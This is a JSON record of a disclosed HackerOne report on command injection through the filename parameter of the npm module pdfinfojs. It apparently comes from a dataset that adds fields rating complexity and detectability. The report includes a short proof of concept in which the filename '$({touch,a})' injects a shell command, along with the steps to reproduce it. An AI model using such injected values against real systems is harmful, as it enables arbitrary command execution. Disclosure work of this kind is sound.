{
  "reported_to": "Node.js third-party modules",
  "reported_by": "caioluders ",
  "title": "[pdfinfojs] Command Injection on filename parameter",
  "content": "\nHello , there is a Command Injection vulnerability on the \"pdfinfojs\" module.\nModule\nmodule name: pdfinfojs\nversion: 0.3.6\nnpm page: https://www.npmjs.com/package/pdfinfojs\nModule Description\npdfinfo shell wrapper for Node.js\nModule Stats\n10 downloads in the last day\n61 downloads in the last week\n106 downloads in the last month\nVulnerability\nVulnerability Description\nThe module appends the filename parameter to the command on the lines 28, 47 and 72 without parsing the user input, thus leading to a Command Injection.\nSteps To Reproduce:\nInstall the module\nCode 23 Bytes\n1$ npm install pdfinfojs\nExample code, similar to the documentation, with the malicious filename $({touch,a}) :\nCode 314 Bytes\n1var pdfinfo = require('pdfinfojs'),\n2    pdf = new pdfinfo('$({touch,a})'); // Malicious payload\n3\n4pdf.getInfo(function(err, info, params) {\n5  if (err) {\n6    console.error(err.stack);\n7  }\n8  else {\n9    console.log(info); //info is an object\n10    console.log(params); // commandline params passed to pdfinfo cmd\n11  }\n12});\nthere are a lot of possibles payloads to achieve this, used this brace expansion just because space in the file name sucks\nRun the code\nCode 81 Bytes\n1$ node index.js\n2Error\n3    ... it throws an error, but the execution is successful\nCheck the newly created file\nCode 16 Bytes\n1$ ls\n2a\t\tindex.js\nPatch\nIt is advisable to use a module that explicitly isolates the parameters to the pdfinfo command.\nTested on :\nmacOS Sierra 10.12.16\nNODEJS v8.4.0\nNPM 5.3.0\n( contacted the maintainer || opened issue ) = False\nImpact\nAn attacker can execute arbitrary commands on the victim's machine\n\n",
  "severity": [
    7.8,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Command Injection - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1524137460,
  "report_url": "https://hackerone.com/reports/330957",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install the module: npm install pdfinfojs"
    ],
    [
      2,
      "Run the example code with a malicious filename payload: node index.js"
    ]
  ],
  "vuln_description": "The 'pdfinfojs' module is vulnerable to command injection via the filename parameter, which is appended to a command without proper input sanitization, allowing arbitrary command execution.",
  "reason": "The vulnerability is straightforward to discover as it involves a common pattern of unsanitized user input being used in a command execution context, a well-known security issue in Node.js modules.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves command injection in a Node.js module (pdfinfojs) where user input is directly appended to a command without proper sanitization. The proposed methodologies focus on authentication and authorization bugs (IDOR, AuthN/AuthZ bypass) within the same application context, not command injection vulnerabilities in third-party modules. The detection methods described are not applicable to this type of vulnerability.",
    "is_detectable": false
  }
}